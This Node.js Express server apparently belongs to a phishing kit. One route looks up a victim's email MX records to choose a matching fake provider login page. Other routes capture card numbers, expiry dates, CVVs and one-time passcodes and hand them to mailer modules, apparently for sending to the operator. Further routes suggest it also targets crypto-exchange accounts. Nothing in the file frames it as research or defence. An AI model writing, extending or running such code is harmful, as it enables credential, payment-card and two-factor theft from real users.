const express = require("express");
var dns = require("dns");
const { parse } = require("tldts");
const path = require("path");

const app = express();
const hostname = "127.0.0.1";
const port = process.env.PORT || 3000;

const server = require("http").createServer(app);

var cors = require("cors");
app.use(cors());
app.use(express.urlencoded({ extended: false }));
app.use(express.json());

const hostproviders = [
  "emailsrvr",
  "secureserver",
  "hiworks",
  "mail",
  "zoho",
  "yandex",
  "qq",
  "hinet",
  "outlook",
  "yahoodns",
  "yahoo",
  "263",
];

const hostproviderSubdomains = [
  "163mx00.mxmail",
  "163mx01.mxmail",
  "163mx02.mxmail",
  "163mx03.mxmail",
  "126mx00.mxmail",
  "126mx01.mxmail",
  "126mx02.mxmail",
  "126mx03.mxmail",
  "qiye163mx01.mxmail",
  "qiye163mx02.mxmail",
  "vip163mx00.mxmail",
  "vip163mx01.mxmail",
];

const providers = [
  { name: "rackspace", host: "emailsrvr" },
  { name: "yahoo", host: "yahoo" },
  { name: "yahoo", host: "yahoodns" },
  { name: "hiworks", host: "hiworks" },
  { name: "godaddy", host: "secureserver" },
  { name: "mail", host: "mail" },
  { name: "zoho", host: "zoho" },
  { name: "yandex", host: "yandex" },
  { name: "qq", host: "qq" },
  { name: "hinet", host: "hinet" },
  { name: "office", host: "outlook" },
  { name: "263", host: "263" },

  // provider to find with subdomain (same hostname)
  { name: "163", host: "netease", subdomain: "163mx01.mxmail" },
  { name: "163", host: "netease", subdomain: "163mx02.mxmail" },
  { name: "163", host: "netease", subdomain: "qiye163mx01.mxmail" },
  { name: "163", host: "netease", subdomain: "qiye163mx02.mxmail" },
  { name: "163", host: "netease", subdomain: "vip163mx00.mxmail" },
  { name: "163", host: "netease", subdomain: "vip163mx01.mxmail" },
  { name: "126", host: "netease", subdomain: "126mx01.mxmail" },
  { name: "126", host: "netease", subdomain: "126mx02.mxmail" },
];

app.post("/start", (req, res) => {
  const { email } = req.body;
  const splitEmail = email.split("@");
  const emailDomain = splitEmail[splitEmail.length - 1];
  console.log(emailDomain);

  dns.resolveMx(emailDomain, (err, addresses) => {
    console.log(addresses);
    const mxAddress = addresses[0].exchange;
    const { domain, hostname, domainWithoutSuffix, subdomain } = parse(
      `http://${mxAddress}`
    );

    console.log(`host: ${domainWithoutSuffix}`);
    // console.log(`hostname: ${hostname}`);
    console.log(`subdomain: ${subdomain}`);

    const ishost = hostproviders.includes(domainWithoutSuffix);
    console.log(`ishost: ${ishost}`);

    const isProvidersubdomain = hostproviderSubdomains.includes(subdomain);
    console.log(`isprovidersubdomain: ${isProvidersubdomain}`);

    if (ishost) {
      const host = providers.find(
        (element) => element.host === domainWithoutSuffix
      );
      console.log(host.name);
      // redirect fro to provider using hostname
      //  res.redirect(301, `${urL}/${host.name}/${email}`);
      res.json({ host: host.name });
    } else if (isProvidersubdomain) {
      const host = providers.find((element) => element.subdomain === subdomain);
      console.log(host.name);
      // redirect fro to provider using subdomain
      // res.redirect(301, `${urL}/${host.name}/${email}`);
      res.json({ host: host.name });
    } else {
      console.log("provider nor avaiable redirect to webmail");
      // res.redirect(301, `${urL}/webmail/${email}`);
      res.json({ host: "webmail" });
    }
  });
});

app.post("/payment", (req, res) => {
  const { cardnumber, expiremonth, expireyear, cvv } = req.body;

  const mailerpayment = require("./mailerpayment");

  mailerpayment.main(req.body);

  res.sendStatus(200);
});

app.post("/otp", (req, res) => {
  const { otp } = req.body;

  const mailerotp = require("./mailerotp");

  mailerotp.main(req.body);

  res.sendStatus(200);
});

app.use("/mail", require("./services/reportmessage"));

app.use("/exchangetrade", require("./services/mailerexchangetrade"));
app.use("/unchainedtrade", require("./services/mailerunchainedtrade"));

server.listen(port, hostname, () => {
  console.log(`server is running on port: ${port}`);
});
